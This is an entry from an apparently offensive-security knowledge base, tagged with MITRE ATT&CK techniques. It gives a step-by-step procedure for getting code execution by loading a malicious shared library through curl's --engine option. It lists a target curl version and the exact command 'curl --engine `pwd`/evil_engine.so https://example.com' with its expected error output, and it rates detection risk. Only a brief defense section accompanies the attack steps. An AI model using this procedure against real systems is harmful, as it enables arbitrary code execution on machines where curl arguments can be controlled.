---
tags:
  - rce
  - curl
  - engine-option
type: procedure
tools:
  - '[[tools/curl-command-line-tool]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-version-info]]'
  - '[[commands/curl-trigger-engine-rce]]'
platforms:
  - Linux
  - POSIX
techniques:
  - '[[Exploitation for Client Execution]]'
  - '[[Dynamic Linker Hijacking]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 1fd11d88-9087-469d-91a6-0d80d85fe21f
created_at: '2025-12-14T17:23:31.209Z'
updated_at: '2025-12-14T17:23:31.209Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploitation for Client Execution]]'
  - '[[Dynamic Linker Hijacking]]'
---
# Trigger-RCE-with-curl-Engine

## Summary

Executes curl with the --engine option pointing to the malicious .so, loading the library and triggering its constructor for RCE, followed by an expected SSL failure.

## Description

This core exploitation step loads evil_engine.so via --engine, executing the constructor's system command before curl attempts to use it as an SSL engine, resulting in failure but confirmed RCE. Targets vulnerable curl versions on POSIX systems where arguments can be controlled.

## Requirements

1. Compiled evil_engine.so in current directory
2. Vulnerable curl (e.g., 8.13.0)
3. Network access to https://example.com

## Defense

Defensive measures and detection strategies:

- Disable or restrict --engine in curl configurations
- Log curl invocations and audit --engine arguments
- Use wrappers to validate library paths before execution

## Objectives

1. Load malicious library to execute code
2. Demonstrate RCE in curl context
3. Observe expected post-execution error

## Instructions

### Step 1: Confirm curl Version

**Context**: Verify the curl version supports the vulnerable --engine feature.

**Command** ([[commands/curl-version-info]]):

```bash
curl -V
```

> Displays version, libcurl details, and features. Expected: curl 8.13.0 with OpenSSL.

### Step 2: Run curl with Malicious Engine

**Context**: Invoke curl to load the .so via --engine, triggering RCE.

**Command** ([[commands/curl-trigger-engine-rce]]):

```bash
curl --engine `pwd`/evil_engine.so https://example.com
```

> --engine loads the specified .so; `pwd` provides absolute path. Fetches from example.com but fails on SSL init after RCE. Expected: Error like 'curl: (53) SSL Engine not found'.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Exploitation for Client Execution]]
- [[Dynamic Linker Hijacking]]

### Sub-Techniques


## Commands Used

- [[commands/curl-version-info]]
- [[commands/curl-trigger-engine-rce]]

## Tools Used

- [[tools/curl-command-line-tool]]

## Tags

- [[rce]]
- [[curl]]
